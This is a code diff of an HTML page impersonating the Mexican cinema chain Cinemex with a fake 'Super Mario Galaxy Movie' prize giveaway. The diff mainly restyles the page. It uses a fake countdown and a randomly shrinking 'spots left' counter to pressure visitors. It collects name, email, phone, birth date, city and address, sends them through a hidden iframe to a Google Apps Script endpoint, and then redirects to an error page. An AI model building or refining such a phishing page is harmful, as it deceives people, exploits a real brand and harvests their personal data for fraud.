@@ -4,188 +4,312 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CINEMEX | The Super Mario Galaxy Movie</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700;900&display=swap" rel="stylesheet">
     <style>
-        /* Mantenemos tus estilos base */
-        * { box-sizing: border-box; margin: 0; padding: 0; }
         :root {
-            --rojo: #e62424;
-            --rojo-oscuro: #b31d1d;
-            --dorado: #ffcc00;
-            --blanco: #ffffff;
-            --sombra: 0 20px 50px rgba(0,0,0,0.5);
+            --primary: #e62424;
+            --primary-glow: rgba(230, 36, 36, 0.6);
+            --accent: #ffcc00;
+            --dark-bg: #05070a;
+            --glass: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.15);
         }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
 
         body {
-            font-family: "Segoe UI", Roboto, sans-serif;
-            background: linear-gradient(rgba(11, 16, 38, 0.8), rgba(11, 16, 38, 0.8)),
-                url('https://images.unsplash.com/photo-1534796636912-3b95b3ab5986?auto=format&fit=crop&q=80&w=2071');
+            font-family: 'Poppins', sans-serif;
+            /* FONDO GALAXIA: Imagen de alta resolución + Capa de profundidad azulada */
+            background: 
+                linear-gradient(rgba(5, 7, 10, 0.4), rgba(5, 7, 10, 0.4)),
+                url('https://images.unsplash.com/photo-1464802686167-b939a6910659?auto=format&fit=crop&q=80&w=2000');
             background-size: cover;
+            background-position: center;
             background-attachment: fixed;
-            color: var(--blanco);
+            color: white;
             min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            overflow-x: hidden;
         }
 
-        .top-warning { background: #ffcc00; color: #000; text-align: center; padding: 8px; font-weight: bold; font-size: 13px; }
-
+        /* Navbar elegante */
         nav {
-            padding: 20px 8%;
-            background: rgba(0, 0, 0, 0.6);
+            padding: 1.5rem 8%;
+            background: rgba(0, 0, 0, 0.7);
             backdrop-filter: blur(15px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
             display: flex;
             justify-content: space-between;
-            border-bottom: 2px solid var(--rojo);
-        }
-
-        .hero {
-            flex: 1;
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 40px;
             align-items: center;
-            padding: 40px 8%;
+            border-bottom: 1px solid var(--glass-border);
         }
 
-        .promo-visual { text-align: center; }
-        .promo-visual img {
-            max-width: 100%;
+        .logo { font-size: 1.8rem; font-weight: 900; letter-spacing: -1px; }
+        .logo span { color: var(--primary); }
+
+        .top-banner {
+            background: var(--accent);
+            color: #000;
+            text-align: center;
+            padding: 5px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            box-shadow: 0 5px 15px rgba(255, 204, 0, 0.3);
+        }
+
+        /* Layout Principal */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 4rem 2rem;
+            display: grid;
+            grid-template-columns: 1fr 450px;
+            gap: 4rem;
+            align-items: center;
+        }
+
+        /* Sección Izquierda: Visual */
+        .hero-info h1 {
+            font-size: 3.5rem;
+            line-height: 1.1;
+            margin-bottom: 1.5rem;
+            text-transform: uppercase;
+            text-shadow: 0 0 20px rgba(255,255,255,0.2);
+        }
+
+        .promo-img {
+            width: 100%;
+            max-width: 500px;
             border-radius: 20px;
-            box-shadow: 0 0 30px rgba(230, 36, 36, 0.4);
-            margin-bottom: 20px;
+            /* Efecto de "aura" espacial */
+            box-shadow: 0 0 60px -10px var(--primary-glow);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            filter: drop-shadow(0 0 10px rgba(0,0,0,0.5));
         }
+        .promo-img:hover { transform: scale(1.05) rotate(1deg); }
 
-        /* ESTILOS DEL CONTADOR */
-        .countdown {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 12px;
-            display: inline-flex;
-            gap: 15px;
-            margin-top: 20px;
-            border: 1px solid rgba(255,255,255,0.2);
+        /* Contador Estilizado */
+        .countdown-container {
+            margin-top: 2rem;
+            display: flex;
+            gap: 1rem;
         }
+        .time-box {
+            background: rgba(0, 0, 0, 0.4);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--glass-border);
+            padding: 1rem;
+            border-radius: 15px;
+            min-width: 85px;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+        .time-box span { display: block; font-size: 1.8rem; font-weight: 900; color: var(--accent); }
+        .time-box label { font-size: 0.65rem; text-transform: uppercase; opacity: 0.8; letter-spacing: 1px; }
 
-        .time-unit { text-align: center; min-width: 60px; }
-        .time-unit div { font-size: 28px; font-weight: bold; color: var(--dorado); }
-        .time-unit span { font-size: 10px; text-transform: uppercase; opacity: 0.8; }
-
+        /* Formulario Estilo Glassmorphism con más contraste */
         .form-card {
-            background: #fdfdfd;
-            color: #222;
-            border-radius: 28px;
-            padding: 40px;
-            box-shadow: var(--sombra);
+            background: rgba(10, 15, 30, 0.6);
+            backdrop-filter: blur(25px);
+            border: 1px solid var(--glass-border);
+            border-radius: 30px;
+            padding: 3rem;
             position: relative;
+            box-shadow: 0 30px 60px rgba(0,0,0,0.6);
         }
 
         .form-card::before {
-            content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 6px;
-            background: linear-gradient(90deg, var(--rojo), var(--dorado));
+            content: '';
+            position: absolute;
+            top: -1px; left: -1px; right: -1px; height: 120px;
+            background: linear-gradient(var(--primary), transparent);
+            z-index: -1; border-radius: 30px; opacity: 0.4;
         }
 
-        .urgency-bar {
-            background: #eee; height: 10px; border-radius: 5px; margin: 25px 0; position: relative;
+        .form-header { margin-bottom: 2rem; text-align: center; }
+        .form-header h2 { font-size: 1.8rem; margin-bottom: 0.5rem; letter-spacing: 1px; }
+        .form-header p { font-size: 0.95rem; opacity: 0.8; }
+
+        /* Progress Bar Moderna */
+        .spots-left {
+            margin: 1.5rem 0;
+            background: rgba(255,255,255,0.1);
+            height: 10px;
+            border-radius: 10px;
+            overflow: hidden;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        .progress-fill {
+            background: linear-gradient(90deg, var(--primary), #ff4d4d);
+            height: 100%;
+            width: 90%;
+            transition: width 1s ease-in-out;
+            box-shadow: 0 0 15px var(--primary);
         }
 
-        .progress {
-            background: var(--rojo); width: 92%; height: 100%; border-radius: 5px;
-            transition: width 10s ease-in-out;
+        .input-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+        }
+        .full-width { grid-column: span 2; }
+
+        .input-group label {
+            display: block;
+            font-size: 0.75rem;
+            margin-bottom: 0.5rem;
+            color: var(--accent);
+            font-weight: 700;
+            letter-spacing: 0.5px;
         }
 
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-        .full { grid-column: 1 / -1; }
-
-        label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 700; color: #444; }
         input {
-            width: 100%; padding: 12px; border: 2px solid #e1e1e1; border-radius: 12px; font-size: 14px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--glass-border);
+            padding: 14px 15px;
+            border-radius: 12px;
+            color: white;
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(0, 0, 0, 0.5);
+            box-shadow: 0 0 15px rgba(230, 36, 36, 0.2);
         }
 
         .cta-button {
-            width: 100%; background: var(--rojo); color: white; padding: 18px; border: none;
-            border-radius: 15px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 20px;
+            width: 100%;
+            margin-top: 2rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            padding: 1.3rem;
+            border-radius: 15px;
+            font-weight: 900;
+            font-size: 1.1rem;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 10px 30px rgba(230, 36, 36, 0.4);
+            transition: all 0.3s;
         }
 
-        @media (max-width: 900px) { .hero { grid-template-columns: 1fr; } .promo-visual { display: none; } }
+        .cta-button:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 15px 40px var(--primary-glow);
+            filter: brightness(1.1);
+        }
+
+        @media (max-width: 968px) {
+            .container { grid-template-columns: 1fr; padding: 2rem; }
+            .hero-info { text-align: center; }
+            .hero-info h1 { font-size: 2.8rem; }
+            .countdown-container { justify-content: center; }
+            .promo-img { max-width: 300px; }
+        }
     </style>
 </head>
 <body>
 
-    <div class="top-warning">
-        ⚠️ PROMOCION UNICA ⚠️
-    </div>
+    <div class="top-banner">✨ ¡SÉ PARTE DE LA LEYENDA GALÁCTICA! - SOLO HOY ✨</div>
 
-     <nav>
-        <div style="font-size: 24px; font-weight: 900;">CINE<span style="color:var(--rojo)">,MEX</span></div>
+    <nav>
+        <div class="logo">CINE<span>MEX</span></div>
+        <div style="font-size: 0.7rem; font-weight: bold; background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px;">SOPORTE OFICIAL</div>
     </nav>
 
-    <section class="hero">
-        <div class="promo-visual">
-            <img src=mario.png>
-            <h2>¡OFERTA POR TIEMPO LIMITADO!</h2>
+    <main class="container">
+        <section class="hero-info">
+            <h1>The Super Mario <br><span style="color:var(--accent)">Galaxy</span> Movie</h1>
+            <p style="font-size: 1.1rem; opacity: 0.9; margin-bottom: 2rem; max-width: 500px;">Regístrate para la preventa exclusiva y gana un <strong>Luma Kit Edición Especial</strong> para el estreno.</p>
             
-            <div class="countdown">
-                <div class="time-unit"><div id="horas">00</div><span>Horas</span></div>
-                <div class="time-unit"><div id="minutos">15</div><span>Minutos</span></div>
-                <div class="time-unit"><div id="segundos">00</div><span>Segundos</span></div>
+            <img src="mario.png" alt="Super Mario Galaxy" class="promo-img">
+
+            <div class="countdown-container">
+                <div class="time-box"><span id="horas">00</span><label>Horas</label></div>
+                <div class="time-box"><span id="minutos">15</span><label>Minutos</label></div>
+                <div class="time-box"><span id="segundos">00</span><label>Segundos</label></div>
             </div>
-        </div>
+        </section>
 
-        <div class="form-card">
-            <h2>¡Últimos Accesos!</h2>
-            <p style="text-align: center; color: #666;">Completa tu perfil para validar tu premio.</p>
-
-            <div class="urgency-bar">
-                <div class="progress" id="barra-progreso"></div>
-                <span style="position: absolute; right: 0; top: -20px; font-size: 11px; font-weight: bold; color: var(--rojo);" id="contador-lugares">¡SOLO QUEDAN 8 LUGARES!</span>
-            </div>
-
-            <div class="grid">
-                <div class="input-group full"><label>Nombre Completo</label><input type="text" id="nombre"></div>
-                <div class="input-group"><label>E-mail Personal</label><input type="email" id="correo"></div>
-                <div class="input-group"><label>Teléfono Móvil</label><input type="tel" id="telefono"></div>
-                <div class="input-group"><label>Fecha de Nacimiento</label><input type="date" id="fecha"></div>
-                <div class="input-group"><label>Lugar de Trabajo</label><input type="text" id="trabajo"></div>
-                <div class="input-group full"><label>Dirección de Envío</label><input type="text" id="direccion"></div>
+        <section class="form-card">
+            <div class="form-header">
+                <h2>RECLAMA TU KIT</h2>
+                <p>Verificación de identidad necesaria</p>
             </div>
 
-            <button class="cta-button" onclick="enviarDatos()">RECLAMAR MI PREMIO AHORA</button>
-        </div>
-    </section>
+            <div style="display:flex; justify-content:space-between; font-size: 0.7rem; font-weight:900; margin-bottom: 5px;">
+                <span style="opacity: 0.8;">DISPONIBILIDAD</span>
+                <span style="color: var(--accent)" id="txt-lugares">8 LUGARES RESTANTES</span>
+            </div>
+            <div class="spots-left">
+                <div class="progress-fill" id="barra-progreso"></div>
+            </div>
+
+            <div class="input-grid">
+                <div class="input-group full-width">
+                    <label>Nombre Completo</label>
+                    <input type="text" id="nombre" placeholder="Nombre y Apellido">
+                </div>
+                <div class="input-group">
+                    <label>E-mail</label>
+                    <input type="email" id="correo" placeholder="tu@correo.com">
+                </div>
+                <div class="input-group">
+                    <label>Teléfono</label>
+                    <input type="tel" id="telefono" placeholder="10 dígitos">
+                </div>
+                <div class="input-group">
+                    <label>Nacimiento</label>
+                    <input type="date" id="fecha">
+                </div>
+                <div class="input-group">
+                    <label>Ciudad</label>
+                    <input type="text" id="trabajo" placeholder="Ciudad">
+                </div>
+                <div class="input-group full-width">
+                    <label>Dirección de Envío</label>
+                    <input type="text" id="direccion" placeholder="Calle, Número, C.P.">
+                </div>
+            </div>
+
+            <button class="cta-button" onclick="enviarDatos()">RECLAMAR PREMIO AHORA</button>
+            <p style="font-size: 0.6rem; text-align: center; margin-top: 1.2rem; opacity: 0.6; line-height: 1.4;">Evento promocional limitado a mayores de edad. Cinemex no se hace responsable por registros fuera de tiempo.</p>
+        </section>
+    </main>
 
     <script>
-        // --- LÓGICA DEL CONTADOR EN TIEMPO REAL ---
-        let tiempoTotal = (15 * 60) + 0; // 15 minutos en segundos
-
+        // --- LÓGICA DEL CONTADOR ---
+        let tiempoTotal = (15 * 60);
         function actualizarContador() {
             let h = Math.floor(tiempoTotal / 3600);
             let m = Math.floor((tiempoTotal % 3600) / 60);
             let s = tiempoTotal % 60;
 
-            // Formato de dos dígitos
             document.getElementById('horas').innerText = h.toString().padStart(2, '0');
             document.getElementById('minutos').innerText = m.toString().padStart(2, '0');
             document.getElementById('segundos').innerText = s.toString().padStart(2, '0');
 
             if (tiempoTotal > 0) {
                 tiempoTotal--;
-                
-                // Simulación: los lugares bajan aleatoriamente
-                if (tiempoTotal % 45 === 0) {
-                   let lugares = Math.floor(Math.random() * 5) + 2;
-                   document.getElementById('contador-lugares').innerText = `¡SOLO QUEDAN ${lugares} LUGARES!`;
-                   document.getElementById('barra-progreso').style.width = (lugares * 10) + "%";
+                if (tiempoTotal % 40 === 0) {
+                   let lugares = Math.floor(Math.random() * 2) + 2;
+                   document.getElementById('txt-lugares').innerText = `¡SOLO QUEDAN ${lugares} LUGARES!`;
+                   document.getElementById('barra-progreso').style.width = (lugares * 12) + "%";
                 }
-            } else {
-                clearInterval(intervalo);
-                alert("La promoción ha expirado.");
             }
         }
+        setInterval(actualizarContador, 1000);
 
-        const intervalo = setInterval(actualizarContador, 1000);
-
-        // --- LÓGICA DE ENVÍO DE DATOS ---
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM6nmoaU0S9XA6gC-FjeAwytNdm4VK6zu8AvZH9ZYV1Gt9oA9CH3PF_qiRYa4EFAgGjA/exec";
+        // --- LÓGICA DE ENVÍO ---
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyM6nmoaU0S9XA6gC-FjeAwytNdm4VK6zu8AvZH9ZYV1Gt9oA9CH3PF_qiRYa4EFAgGjA/exec"; 
+        
         function enviarDatos() {
             const data = {
                 nombre: document.getElementById('nombre').value.trim(),
@@ -197,10 +321,15 @@
             };
 
             if (Object.values(data).some(x => x === "")) {
-                alert('Debe completar todos los campos para la validación.');
+                alert('Todos los campos son obligatorios para la entrega del Kit.');
                 return;
             }
 
+            const btn = document.querySelector('.cta-button');
+            btn.innerText = "ENVIANDO A LA GALAXIA...";
+            btn.disabled = true;
+
+            // Formulario oculto para el envío
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.name = 'hidden_iframe';
@@ -223,8 +352,8 @@
             form.submit();
 
             setTimeout(() => {
-                window.location.href = 'error.html';
-            }, 500);
+                window.location.href = 'error.html'; 
+            }, 1000);
         }
     </script>
 </body>
